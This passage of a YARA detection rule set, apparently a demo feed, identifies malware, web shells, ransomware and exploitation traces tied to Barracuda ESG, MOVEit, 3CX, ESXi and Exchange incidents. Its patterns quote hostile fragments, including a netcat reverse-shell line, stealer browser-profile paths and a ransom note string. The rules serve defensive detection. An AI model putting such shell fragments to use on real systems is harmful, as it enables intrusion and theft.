      tags = "CVE_2023_2283, DEMO, EXPLOIT, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "nprocs = %d" ascii fullword
      $s2 = "fork failed: %s" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and all of them
}

rule MAL_ELF_ReverseShell_SSLShell_Jun23_1_RID341E : CVE_2023_2868 DEMO FILE LINUX MAL SCRIPT {
   meta:
      description = "Detects a reverse shell named SSLShell used in Barracuda ESG exploitation (CVE-2023-2868)"
      author = "Florian Roth"
      reference = "https://www.barracuda.com/company/legal/esg-vulnerability"
      date = "2023-06-07 15:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8849a3273e0362c45b4928375d196714224ec22cb1d2df5d029bf57349860347"
      tags = "CVE_2023_2868, DEMO, FILE, LINUX, MAL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $sc1 = { 00 2D 63 00 2F 62 69 6E 2F 73 68 00 } 
      $s1 = "SSLShell" 
   condition: 
      uint32be ( 0 ) == 0x7f454c46 and uint16 ( 0x10 ) == 0x0002 and filesize < 5MB and all of them
}

rule MAL_ELF_SALTWATER_Jun23_1_RID2EB8 : CVE_2023_2868 DEMO LINUX MAL {
   meta:
      description = "Detects SALTWATER malware used in Barracuda ESG exploitations (CVE-2023-2868)"
      author = "Florian Roth"
      reference = "https://www.barracuda.com/company/legal/esg-vulnerability"
      date = "2023-06-07 11:26:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "601f44cc102ae5a113c0b5fe5d18350db8a24d780c0ff289880cc45de28e2b80"
      tags = "CVE_2023_2868, DEMO, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "libbindshell.so" 
      $s1 = "ShellChannel" 
      $s2 = "MyWriteAll" 
      $s3 = "CheckRemoteIp" 
      $s4 = "run_cmd" 
      $s5 = "DownloadByProxyChannel" 
      $s6 = "[-] error: popen failed" 
      $s7 = "/home/product/code/config/ssl_engine_cert.pem" 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 6000KB and ( ( 1 of ( $x* ) and 2 of them ) or 3 of them ) or all of them
}

rule WEBSHELL_ASPX_DLL_MOVEit_Jun23_1_RID3131 : DEMO EXE T1505_003 WEBSHELL {
   meta:
      description = "Detects compiled ASPX web shells found being used in MOVEit Transfer exploitation"
      author = "Florian Roth"
      reference = "https://www.trustedsec.com/blog/critical-vulnerability-in-progress-moveit-transfer-technical-analysis-and-recommendations/?utm_content=251159938&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306"
      date = "2023-06-01 13:12:01"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6cbf38f5f27e6a3eaf32e2ac73ed02898cbb5961566bb445e3c511906e2da1fa"
      tags = "DEMO, EXE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "human2_aspx" ascii fullword
      $x2 = "X-siLock-Comment" wide
      $x3 = "x-siLock-Step1" wide
      $a1 = "MOVEit.DMZ.Core.Data" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) and $a1 ) or all of them
}

rule WEBSHELL_ASPX_MOVEit_Jun23_1_RID2FF6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects ASPX web shells as being used in MOVEit Transfer exploitation"
      author = "Florian Roth"
      reference = "https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/"
      date = "2023-06-01 12:19:31"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5"
      hash2 = "48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a"
      hash3 = "e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "X-siLock-Comment" ascii fullword
      $s2 = "]; string x = null;" ascii
      $s3 = ";  if (!String.Equals(pass, " ascii
   condition: 
      filesize < 150KB and 2 of them
}

rule APT_MAL_RU_Snake_Indicators_May23_1_RID3370 : APT DEMO G0010 MAL RUSSIA {
   meta:
      description = "Detects indicators found in Snake malware samples"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF"
      date = "2023-05-10 14:47:51"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "10b854d66240d9ee1ce4296d2f7857d2b1c6f062ca836d13d777930d678b3ca6"
      hash2 = "15ac5a61fb3e751045de2d7f5ff26c673f3883e326cd1b3a63889984a4fb2a8f"
      hash3 = "315ec991709eb45eccf724dfe31bccb7affcac7f8e8007e688ba8d02827205e0"
      tags = "APT, DEMO, G0010, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\\\.\\%s\\\\" ascii fullword
      $s2 = "read_peer_nfo" ascii fullword
      $s3 = "rcv_buf=%d%c" ascii fullword
      $s4 = "%s: (0x%08x)" ascii fullword
      $s5 = "no_impersonate" ascii fullword
   condition: 
      all of them
}

rule APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_3_RID3302 : APT DEMO MAL {
   meta:
      description = "Detects malicious VEILEDSIGNAL backdoor"
      author = "X__Junior"
      reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain"
      date = "2023-04-29 14:29:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 4C 8B CB 4C 89 74 24 ?? 4C 8D 05 ?? ?? ?? ?? 44 89 74 24 ?? 33 D2 33 C9 FF 15 } 
      $op2 = { 89 7? 24 ?? 44 8B CD 4C 8B C? 48 89 44 24 ?? 33 D2 33 C9 FF 15 } 
      $op3 = { 8B 54 24 ?? 4C 8D 4C 24 ?? 45 8D 46 ?? 44 89 74 24 ?? 48 8B CB FF 15 } 
      $op4 = { 48 8D 44 24 ?? 45 33 C9 41 B8 01 00 00 40 48 89 44 24 ?? 41 8B D5 48 8B CF FF 15 } 
   condition: 
      all of them
}

rule APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_4_RID3303 : APT DEMO MAL {
   meta:
      description = "Detects malicious VEILEDSIGNAL backdoor"
      author = "X__Junior"
      reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain"
      date = "2023-04-29 14:29:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 74 ?? 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 74 ?? 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 } 
      $op2 = { 48 8B C8 48 8D 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 45 33 C0 4C 8D 4D ?? B2 01 41 8D 48 ?? FF D0 } 
      $op3 = { 33 FF C7 44 24 ?? 38 02 00 00 33 D2 8D 4F ?? FF 15 ?? ?? ?? ?? 48 8B D8 48 83 F8 FF 74 ?? 48 8D 54 24 ?? 48 8B C8 FF 15 } 
      $op4 = { 4C 8D 05 ?? ?? ?? ?? 48 89 4C 24 ?? 4C 8B C8 33 D2 89 4C 24 ?? FF 15 } 
   condition: 
      all of them
}

rule APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_RID3270 : APT DEMO EXE FILE MAL {
   meta:
      description = "Detects malicious VEILEDSIGNAL backdoor"
      author = "X__Junior"
      reference = "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
      date = "2023-04-20 14:05:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43"
      tags = "APT, DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { B8 AB AA AA AA F7 E1 8B C1 C1 EA 02 8D 14 52 03 D2 2B C2 8A 84 05 ?? ?? ?? ?? 30 84 0D ?? ?? ?? ?? } 
      $op2 = { 50 66 0F 13 85 ?? ?? ?? ?? 66 0F 13 85 ?? ?? ?? ?? 66 0F 13 85 ?? ?? ?? ?? 66 0F 13 85 ?? ?? ?? ?? C7 85 ?? ?? ?? ?? 3C 00 00 00 C7 85 ?? ?? ?? ?? 40 00 00 00 C7 85 ?? ?? ?? ?? 05 00 00 00 FF 15 } 
      $op3 = { 6A 00 8D 85 ?? ?? ?? ?? 50 6A 04 8D 85 ?? ?? ?? ?? 50 57 FF 15 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
}

rule MAL_RANSOM_LockBit_Locker_LOG_Apr23_1_RID3398 : CRIME DEMO LOG LockBit MAL RANSOM {
   meta:
      description = "Detects indicators found in LockBit ransomware log files"
      author = "Florian Roth"
      reference = "https://objective-see.org/blog/blog_0x75.html"
      date = "2023-04-17 14:54:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CRIME, DEMO, LOG, LockBit, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = " is encrypted. Checksum after encryption " 
      $s2 = "~~~~~Hardware~~~~" 
      $s3 = "[+] Add directory to encrypt:" 
      $s4 = "][+] Launch parameters: " 
   condition: 
      2 of them
}

rule MAL_PHP_EFile_Apr23_1_RID2DCD : DEMO MAL {
   meta:
      description = "Detects malware "
      author = "Florian Roth"
      reference = "https://twitter.com/malwrhunterteam/status/1642988428080865281?s=12&t=C0_T_re0wRP_NfKa27Xw9w"
      date = "2023-04-06 10:47:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )" ascii
      $s2 = "C:\\\\ProgramData\\\\Browsers" ascii fullword
      $s3 = "curl_https($api_url." ascii
   condition: 
      all of them
}

rule MAL_Shellcode_Loader_Apr23_RID307A : DEMO MAL {
   meta:
      description = "Detects shellcode loader as seen being used by Gopuram backdoor"
      author = "X__Junior (Nextron Systems)"
      reference = "https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/"
      date = "2023-04-03 12:41:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6ce5b6b4cdd6290d396465a1624d489c7afd2259a4d69b73c6b0ba0e5ad4e4ad"
      hash2 = "b56279136d816a11cf4db9fc1b249da04b3fa3aef4ba709b20cdfbe572394812"
      tags = "DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 41 C1 CB 0D 0F BE 03 48 FF C3 44 03 D8 80 7B ?? 00 75 ?? 41 8D 04 13 3B C6 74 } 
      $op2 = { B9 49 F7 02 78 4C 8B E8 E8 ?? ?? ?? ?? B9 58 A4 53 E5 48 89 44 24 ?? E8 ?? ?? ?? ?? B9 10 E1 8A C3 48 8B F0 E8 ?? ?? ?? ?? B9 AF B1 5C 94 48 89 44 24 ?? E8 } 
   condition: 
      all of them
}

rule APT_MAL_NK_3CX_ICONIC_Stealer_Mar23_1_RID330B : APT DEMO EXE MAL NK {
   meta:
      description = "Detects ICONIC stealer payload used in the 3CX incident"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/volexity/threat-intel/blob/main/2023/2023-03-30%203CX/attachments/iconicstealer.7z"
      date = "2023-03-31 14:31:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8ab3a5eaaf8c296080fadf56b265194681d7da5da7c02562953a4cb60e147423"
      tags = "APT, DEMO, EXE, MAL, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "{\"HostName\": \"%s\", \"DomainName\": \"%s\", \"OsVersion\": \"%d.%d.%d\"}" wide fullword
      $s2 = "******************************** %s ******************************" wide fullword
      $s3 = "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data" wide fullword
      $s4 = "AppData\\Roaming\\Mozilla\\Firefox\\Profiles" wide fullword
      $s5 = "SELECT url, title FROM urls ORDER BY id DESC LIMIT 500" wide fullword
      $s6 = "TEXT value in %s.%s" ascii fullword
      $op1 = { 48 63 d1 48 63 ce 49 03 d1 49 03 cd 4c 63 c7 e8 87 1f 09 00 8b 45 d0 44 8d 04 37 } 
      $op2 = { 48 8b c8 8b 56 f0 48 89 46 d8 e8 78 8f f8 ff e9 ec 13 00 00 c7 46 20 ff ff ff ff e9 e0 13 00 00 33 ff } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 4 of them or 6 of them
}

rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_2_RID3502 : APT DEMO EXE MAL NK {
   meta:
      description = "Detects malicious DLLs related to 3CX compromise (decrypted payload)"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://twitter.com/dan__mayer/status/1641170769194672128?s=20"
      date = "2023-03-29 15:54:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973"
      tags = "APT, DEMO, EXE, MAL, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "raw.githubusercontent.com/IconStorages/images/main/icon%d.ico" wide fullword
      $s2 = "https://raw.githubusercontent.com/IconStorages" wide fullword
      $s3 = "icon%d.ico" wide fullword
      $s4 = "__tutmc" ascii fullword
      $op1 = { 2d ee a1 00 00 c5 fa e6 f5 e9 40 fe ff ff 0f 1f 44 00 00 75 2e c5 fb 10 0d 46 a0 00 00 44 8b 05 7f a2 00 00 e8 0a 0e 00 00 } 
      $op4 = { 4c 8d 5c 24 71 0f 57 c0 48 89 44 24 60 89 44 24 68 41 b9 15 cd 5b 07 0f 11 44 24 70 b8 b1 68 de 3a 41 ba a4 7b 93 02 } 
      $op5 = { f7 f3 03 d5 69 ca e8 03 00 00 ff 15 c9 0a 02 00 48 8d 44 24 30 45 33 c0 4c 8d 4c 24 38 48 89 44 24 20 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 3 of them or 5 of them
}

rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_3_RID3503 : APT DEMO MAL NK {
   meta:
      description = "Detects malicious DLLs related to 3CX compromise (decrypted payload)"
      author = "Florian Roth , X__Junior (Nextron Systems)"
      reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
      date = "2023-03-29 15:55:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973"
      tags = "APT, DEMO, MAL, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $opa1 = { 41 81 C0 ?? ?? ?? ?? 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1 41 69 D0 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 ?? ?? ?? ?? 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 } 
      $opa2 = { 8B C8 41 69 D1 ?? ?? ?? ?? C1 E1 ?? 33 C1 45 8B CA 8B C8 C1 E9 ?? 33 C1 81 C2 ?? ?? ?? ?? 8B C8 C1 E1 ?? 33 C1 41 8B C8 4C 0F AF CF 44 69 C2 ?? ?? ?? ?? 4C 03 C9 45 8B D1 4C 0F AF D7 } 
      $opb1 = { 45 33 C9 48 89 6C 24 ?? 48 8D 44 24 ?? 48 89 6C 24 ?? 8B D3 48 89 B4 24 ?? ?? ?? ?? 48 89 44 24 ?? 45 8D 41 ?? FF 15 } 
      $opb2 = { 44 8B 0F 45 8B C6 48 8B 4D ?? 49 8B D7 44 89 64 24 ?? 48 89 7C 24 ?? 44 89 4C 24 ?? 4C 8D 4D ?? 48 89 44 24 ?? 44 89 64 24 ?? 4C 89 64 24 ?? FF 15 } 
      $opb3 = { 48 FF C2 66 44 39 2C 56 75 ?? 4C 8D 4C 24 ?? 45 33 C0 48 8B CE FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? 44 0F B7 44 24 ?? 33 F6 48 8B 54 24 ?? 45 33 C9 48 8B 0B 48 89 74 24 ?? 89 74 24 ?? C7 44 24 ?? ?? ?? ?? ?? 48 89 74 24 ?? FF 15 } 
      $opb4 = { 33 C0 48 8D 6B ?? 4C 8D 4C 24 ?? 89 44 24 ?? BA ?? ?? ?? ?? 48 89 44 24 ?? 48 8B CD 89 44 24 ?? 44 8D 40 ?? 8B F8 FF 15 } 
   condition: 
      ( all of ( $opa* ) ) or ( 1 of ( $opa* ) and 1 of ( $opb* ) ) or ( 3 of ( $opb* ) )
}

rule MAL_RANSOM_DarkBit_Feb23_1_RID2F7B : CRIME DEMO DarkBit EXE FILE MAL RANSOM {
   meta:
      description = "Detects indicators found in DarkBit ransomware"
      author = "Florian Roth"
      reference = "https://twitter.com/idonaor1/status/1624703255770005506?s=12&t=mxHaauzwR6YOj5Px8cIeIw"
      date = "2023-02-13 11:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CRIME, DEMO, DarkBit, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ".onion" ascii
      $s2 = "GetMOTWHostUrl" 
      $x1 = "hus31m7c7ad.onion" 
      $x2 = "iw6v2p3cruy" 
      $xn1 = "You will receive decrypting key after the payment." 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10MB and ( 1 of ( $x* ) or 2 of them ) or 4 of them or ( filesize < 10MB and $xn1 )
}

rule MAL_RANSOM_SH_ESXi_Attacks_Feb23_2_RID3258 : CRIME DEMO MAL RANSOM SCRIPT {
   meta:
      description = "Detects script used in ransomware attacks exploiting and encrypting ESXi servers"
      author = "Florian Roth"
      reference = "https://dev.to/xakrume/esxiargs-encryption-malware-launches-massive-attacks-against-vmware-esxi-servers-pfe"
      date = "2023-02-06 14:01:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CRIME, DEMO, MAL, RANSOM, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "echo \"START ENCRYPT: $file_e SIZE: $size_kb STEP SIZE: " ascii
   condition: 
      filesize < 10KB and 1 of them
}

rule MAL_RANSOM_ELF_ESXi_Attacks_Feb23_1_RID3293 : CRIME DEMO LINUX MAL RANSOM {
   meta:
      description = "Detects ransomware exploiting and encrypting ESXi servers"
      author = "Florian Roth"
      reference = "https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14"
      date = "2023-02-04 14:11:01"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "11b1b2375d9d840912cfd1f0d0d04d93ed0cddb0ae4ddb550a5b62cd044d6b66"
      tags = "CRIME, DEMO, LINUX, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]" ascii fullword
      $x2 = "[ %s ] - FAIL { Errno: %d }" ascii fullword
      $s1 = "lPEM_read_bio_RSAPrivateKey" ascii fullword
      $s2 = "lERR_get_error" ascii fullword
      $s3 = "get_pk_data: key file is empty!" ascii fullword
      $op1 = { 8b 45 a8 03 45 d0 89 45 d4 8b 45 a4 69 c0 07 53 65 54 89 45 a8 8b 45 a8 c1 c8 19 } 
      $op2 = { 48 89 95 40 fd ff ff 48 83 bd 40 fd ff ff 00 0f 85 2e 01 00 00 48 8b 9d 50 ff ff ff 48 89 9d 30 fd ff ff 48 83 bd 30 fd ff ff 00 78 13 f2 48 0f 2a 85 30 fd ff ff } 
      $op3 = { 31 55 b4 f7 55 b8 8b 4d ac 09 4d b8 8b 45 b8 31 45 bc c1 4d bc 13 c1 4d b4 1d } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
}

rule EXPL_ManageEngine_CVE_2022_47966_Jan23_1_RID3386 : CVE_2022_47966 DEMO EXPLOIT {
   meta:
      description = "Detects indicators of exploitation of ManageEngine vulnerability as described by Horizon3"
      author = "Florian Roth"
      reference = "https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/"
      date = "2023-01-13 14:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2022_47966, DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $ = "]: com.adventnet.authentication.saml.SamlException: Signature validation failed. SAML Response rejected|" 
   condition: 
      1 of them
}

rule APT_MAL_RANSOM_ViceSociety_PolyVice_Jan23_1_RID361B : APT DEMO EXE MAL RANSOM polyvice {
   meta:
      description = "Detects NTRU-ChaChaPoly (PolyVice) malware used by Vice Society"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/labs/custom-branded-ransomware-the-vice-society-group-and-the-threat-of-outsourced-development/"
      date = "2023-01-12 16:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-13"
      hash1 = "326a159fc2e7f29ca1a4c9a64d45b76a4a072bc39ba864c49d804229c5f6d796"
      hash2 = "8c8cb887b081e0d92856fb68a7df0dabf0b26ed8f0a6c8ed22d785e596ce87f4"
      hash3 = "9d9e949ecd72d7a7c4ae9deae4c035dcae826260ff3b6e8a156240e28d7dbfef"
      tags = "APT, DEMO, EXE, MAL, RANSOM, polyvice"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "C:\\Users\\root\\Desktop\\niX\\CB\\libntru\\" ascii
      $s1 = "C:\\Users\\root" ascii fullword
      $s2 = "#DBG: target = %s" ascii fullword
      $s3 = "# ./%s [-p <path>]/[-f <file> ] [-e <enc.extension>] [-m <requirements file name>]" ascii fullword
      $s4 = "### ################# ###" ascii fullword
      $op1 = { 89 ca 41 01 fa 89 ef 8b 6c 24 24 44 89 c9 09 d1 44 31 e6 89 c8 } 
      $op2 = { bd 02 00 00 00 29 cd 48 0f bf d1 8b 44 46 02 01 44 53 02 8d 54 0d 00 83 c1 02 48 0f bf c2 } 
      $op3 = { 48 29 c4 4c 8d 74 24 30 4c 89 f1 e8 46 3c 00 00 84 c0 41 89 c4 0f 85 2b 02 00 00 0f b7 45 f2 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 2 of them ) or 4 of them
}

rule HKTL_NATBypass_Dec22_1_RID2E57 : DEMO G0096 HKTL T1090 {
   meta:
      description = "Detects NatBypass tool (also used by APT41)"
      author = "Florian Roth"
      reference = "https://github.com/cw1997/NATBypass"
      date = "2022-12-27 11:10:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4550635143c9997d5499d1d4a4c860126ee9299311fed0f85df9bb304dca81ff"
      tags = "DEMO, G0096, HKTL, T1090"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "nb -slave 127.0.0.1:3389 8.8.8.8:1997" ascii
      $x2 = "| Welcome to use NATBypass Ver" ascii
      $s1 = "main.port2host.func1" ascii fullword
      $s2 = "start to transmit address:" ascii
      $s3 = "^(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])" 
   condition: 
      filesize < 8000KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them
}

rule APT_SH_ESXi_Backdoor_Dec22_RID2FFB : APT DEMO SCRIPT {
   meta:
      description = "Detects malicious script found on ESXi servers"
      author = "Florian Roth"
      reference = "https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers"
      date = "2022-12-14 12:20:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "mv /bin/hostd-probe.sh /bin/hostd-probe.sh.1" ascii fullword
      $x2 = "/bin/nohup /bin/python -u /store/packages/vmtools.py" ascii
      $x3 = "/bin/rm /bin/hostd-probe.sh.1" 
   condition: 
      filesize < 10KB and 1 of them
}

rule APT_PY_ESXi_Backdoor_Dec22_RID3009 : APT DEMO SCRIPT T1059_006 {
   meta:
      description = "Detects Python backdoor found on ESXi servers"
      author = "Florian Roth"
      reference = "https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers"
      date = "2022-12-14 12:22:41"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, SCRIPT, T1059_006"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "cmd = str(base64.b64decode(encoded_cmd), " ascii
      $x2 = "sh -i 2>&1 | nc %s %s > /tmp/" ascii
   condition: 
      filesize < 10KB and 1 of them or all of them
}

rule MAL_Grace_Dec22_RID2BFB : DEMO MAL {
   meta:
      description = "Detects Grace (aka FlawedGrace and GraceWire) RAT"
      author = "X__Junior"
      reference = "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      date = "2022-12-13 09:29:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a66df3454b8c13f1b92d8b2cf74f5bfcdedfbff41a5e4add62e15277d14dd169"
      hash2 = "e113a8df3c4845365f924bacf10c00bcc5e17587a204b640852dafca6db20404"
      tags = "DEMO, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $sa1 = "Grace finalized, no more library calls allowed." ascii
      $sa2 = "Socket forcibly closed due to no response to DISCONNECT signal from other side, worker id(%d)" ascii
      $sa3 = "AVWireCleanupThread" ascii
      $sa4 = "AVTunnelClientDirectIO" ascii
      $sa5 = "AVGraceTunnelWriteThread" ascii
      $sa6 = "AVGraceTunnelClientDirectIO" ascii
   condition: 
      2 of them
}

rule HKTL_BruteRatel_Badger_Indicators_Oct22_4_RID362C : BruteRatelC4 DEMO FILE HKTL {
   meta:
      description = "Detects Brute Ratel C4 badger indicators"
      author = "Florian Roth"
      reference = "https://twitter.com/embee_research/status/1580030310778953728"
      date = "2022-10-12 16:44:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "BruteRatelC4, DEMO, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = { b? 89 4d 39 8c } 
      $s2 = { b? bd ca 3b d3 } 
      $s3 = { b? b2 c1 06 ae } 
      $s4 = { b? 74 eb 1d 4d } 
   condition: 
      filesize < 8000KB and all of ( $s* ) and not uint8 ( 0 ) == 0x02
}

rule EXPL_Exchange_ProxyNotShell_Patterns_CVE_2022_41040_Oct22_1_RID3B59 : CVE_2022_41040 DEMO EXPLOIT SCRIPT {
   meta:
      description = "Detects successful ProxyNotShell exploitation attempts in log files (attempt to identify the attack before the official release of detailed information)"
      author = "Florian Roth"
      reference = "https://github.com/kljunowsky/CVE-2022-41040-POC"
      date = "2022-10-11 20:25:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-03-15"
      tags = "CVE_2022_41040, DEMO, EXPLOIT, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $sr1 = / \/autodiscover\/autodiscover\.json[^\n]{1,300}owershell/ ascii nocase
      $sa1 = " 200 " 
      $fp1 = " 444 " 
      $fp2 = " 404 " 
      $fp2b = " 401 " 
      $fp3 = "GET /owa/ &Email=autodiscover/autodiscover.json%3F@test.com&ClientId=" ascii
      $fp4 = "@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com" ascii
   condition: 
      $sr1 and 1 of ( $sa* ) and not 1 of ( $fp* )
}

rule MAL_QBot_HTML_Smuggling_Indicators_Oct22_1_RID3648 : DEMO MAL Qakbot {
   meta:
      description = "Detects double encoded PKZIP headers as seen in HTML files used by QBot"
